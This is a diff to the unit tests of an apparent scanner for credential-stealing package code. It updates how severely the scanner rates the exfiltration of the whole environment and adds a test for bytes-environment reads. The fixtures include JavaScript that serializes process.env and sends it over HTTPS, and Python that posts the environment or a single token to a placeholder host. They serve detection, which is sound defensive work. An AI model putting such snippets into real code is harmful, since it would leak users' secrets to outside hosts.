@@ -336,7 +336,20 @@ class EnvironmentCopyTests(unittest.TestCase):
                                             "exfiltration service (5cecdbdb.ngrok.app)"], "CRITICAL"))
         js = "const https = require('https');\nconst e = { ...process.env };\nconst body = JSON.stringify(e);\nhttps.request(o).end(body);\n"
         self.assertEqual(on_import(js, "js"), (["reads credentials or the whole environment and sends data over the "
-                                                 "network"], "MAJOR"))
+                                                 "network"], "CRITICAL"))         # 2.17: sent anywhere
+
+    def test_the_bytes_environment(self):
+        # 2.17: os.environb is the environment too, and a variable read from
+        # it is one variable, as from os.environ (pyarmor reads its proxy
+        # setting with os.environb.get(b'http_proxy'))
+        send = "import os, requests\nrequests.post('https://x.invalid/c', data=%s)\n"
+        self.assertEqual(core.local_data_sent_at(send % "dict(os.environb)")[1:3],
+                         ("environment", "the whole environment"))
+        self.assertEqual(on_import(send % "dict(os.environb)")[1], "CRITICAL")
+        for one in ("os.environb.get(b'EXAMPLE_TOKEN')", "os.environb[b'EXAMPLE_TOKEN']", "os.getenvb(b'EXAMPLE_TOKEN')"):
+            with self.subTest(one):
+                self.assertEqual(core.local_data_sent_at(send % one)[1:3], ("environment", "EXAMPLE_TOKEN"))
+                self.assertEqual(on_import(send % one)[0], [])
 
     def test_a_copy_handed_to_a_subprocess_is_not_a_harvest(self):
         text = ("import os, subprocess, requests\nenv = dict(os.environ)\nenv['PATH'] = '/opt/bin'\n"
